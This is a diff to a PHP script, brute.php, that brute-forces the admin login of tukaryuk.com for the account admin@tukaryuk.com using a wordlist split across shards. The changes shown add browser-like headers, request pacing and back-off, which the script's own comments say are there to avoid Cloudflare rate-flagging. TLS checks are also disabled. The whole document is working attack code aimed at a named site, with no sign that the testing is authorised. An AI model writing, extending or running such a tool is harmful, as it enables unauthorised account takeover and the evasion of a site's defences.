@@ -1,7 +1,7 @@
 <?php
-/* brute.php — tukaryuk.com admin login worker (shard-aware)
+/* brute.php v2 — tukaryuk.com admin login worker (shard-aware, paced, browser-like)
  * usage: php brute.php <shard> <nshards> <wordlist> <outfile> [base_url]
- * Laravel CSRF token is session-wide and reusable -> 1 GET per session.
+ * v2: adds browser headers + pacing to avoid Cloudflare rate-flagging.
  */
 $shard = (int)($argv[1] ?? 0);
 $nsh   = max(1, (int)($argv[2] ?? 1));
@@ -9,16 +9,41 @@ $wl    = $argv[3] ?? '/tmp/wl.txt';
 $out   = $argv[4] ?? '/tmp/brute.out';
 $base  = $argv[5] ?? 'https://tukaryuk.com';
 $email = 'admin@tukaryuk.com';
+$DELAY = 600000; // 0.6s between requests -> ~1.5/s
 $UA    = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';
+$HDR = [
+    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
+    'Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
+    'Upgrade-Insecure-Requests: 1',
+    'Sec-Fetch-Dest: document',
+    'Sec-Fetch-Mode: navigate',
+    'Sec-Fetch-Site: same-origin',
+    'Sec-Fetch-User: ?1',
+    'Cache-Control: max-age=0',
+];
 
 $words = @file($wl, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
 if (!$words) { file_put_contents($out, "NO WORDLIST $wl\n", FILE_APPEND); exit(1); }
 $total = count($words);
-file_put_contents($out, "START shard=$shard/$nsh words=$total host=" . gethostname() . "\n", FILE_APPEND);
+file_put_contents($out, "START v2 shard=$shard/$nsh words=$total host=" . gethostname() . "\n", FILE_APPEND);
+
+function get_token($base, $UA, $HDR, $jar, &$status) {
+    $ch = curl_init($base . '/admin/login');
+    curl_setopt_array($ch, [
+        CURLOPT_RETURNTRANSFER => 1, CURLOPT_COOKIEJAR => $jar, CURLOPT_COOKIEFILE => $jar,
+        CURLOPT_USERAGENT => $UA, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0,
+        CURLOPT_TIMEOUT => 30, CURLOPT_CONNECTTIMEOUT => 20, CURLOPT_HTTPHEADER => $HDR,
+        CURLOPT_ENCODING => '',
+    ]);
+    $html = curl_exec($ch);
+    $status = (int)curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    curl_close($ch);
+    if ($html && preg_match('/name="_token" value="([^"]+)"/', $html, $m)) return $m[1];
+    return null;
+}
 
 $jar = tempnam(sys_get_temp_dir(), 'ck');
-$tok = null;
-$i = 0;
+$tok = null; $i = 0; $tokfail = 0;
 $t0 = time();
 
 for ($idx = 0; $idx < $total; $idx++) {
@@ -27,19 +52,12 @@ for ($idx = 0; $idx < $total; $idx++) {
 
     if ($tok === null || $i % 40 === 0) {
         @unlink($jar);
-        $ch = curl_init($base . '/admin/login');
-        curl_setopt_array($ch, [
-            CURLOPT_RETURNTRANSFER => 1, CURLOPT_COOKIEJAR => $jar, CURLOPT_COOKIEFILE => $jar,
-            CURLOPT_USERAGENT => $UA, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0,
-            CURLOPT_TIMEOUT => 30, CURLOPT_CONNECTTIMEOUT => 20,
-        ]);
-        $html = curl_exec($ch);
-        curl_close($ch);
-        if ($html && preg_match('/name="_token" value="([^"]+)"/', $html, $m)) {
-            $tok = $m[1];
-        } else {
-            $tok = null;
-            file_put_contents($out, "tokfail idx=$idx\n", FILE_APPEND);
+        $st = 0;
+        $tok = get_token($base, $UA, $HDR, $jar, $st);
+        if ($tok === null) {
+            $tokfail++;
+            file_put_contents($out, "tokfail idx=$idx http=$st\n", FILE_APPEND);
+            if ($tokfail % 5 === 0) sleep(45);   // back off hard when CF challenges
             continue;
         }
     }
@@ -53,8 +71,8 @@ for ($idx = 0; $idx < $total; $idx++) {
         ]),
         CURLOPT_USERAGENT => $UA, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0,
         CURLOPT_TIMEOUT => 30, CURLOPT_CONNECTTIMEOUT => 20, CURLOPT_FOLLOWLOCATION => 0,
-        CURLOPT_HEADER => 1,
-        CURLOPT_HTTPHEADER => ['Referer: ' . $base . '/admin/login', 'Origin: ' . $base],
+        CURLOPT_HEADER => 1, CURLOPT_HTTPHEADER => $HDR,
+        CURLOPT_ENCODING => '',
     ]);
     $resp = curl_exec($ch);
     $code = (int)curl_getinfo($ch, CURLINFO_HTTP_CODE);
@@ -73,8 +91,9 @@ for ($idx = 0; $idx < $total; $idx++) {
     }
     if ($i % 100 === 0) {
         $el = max(1, time() - $t0);
-        file_put_contents($out, sprintf("progress i=%d rate=%.2f/s last=%s\n", $i, $i / $el, $pw), FILE_APPEND);
+        file_put_contents($out, sprintf("progress i=%d rate=%.2f/s tokfail=%d last=%s\n", $i, $i / $el, $tokfail, $pw), FILE_APPEND);
     }
+    usleep($DELAY);
 }
 $el = max(1, time() - $t0);
-file_put_contents($out, sprintf("DONE shard=%d i=%d elapsed=%ds rate=%.2f/s\n", $shard, $i, $el, $i / $el), FILE_APPEND);
+file_put_contents($out, sprintf("DONE shard=%d i=%d tokfail=%d elapsed=%ds rate=%.2f/s\n", $shard, $i, $tokfail, $el, $i / $el), FILE_APPEND);
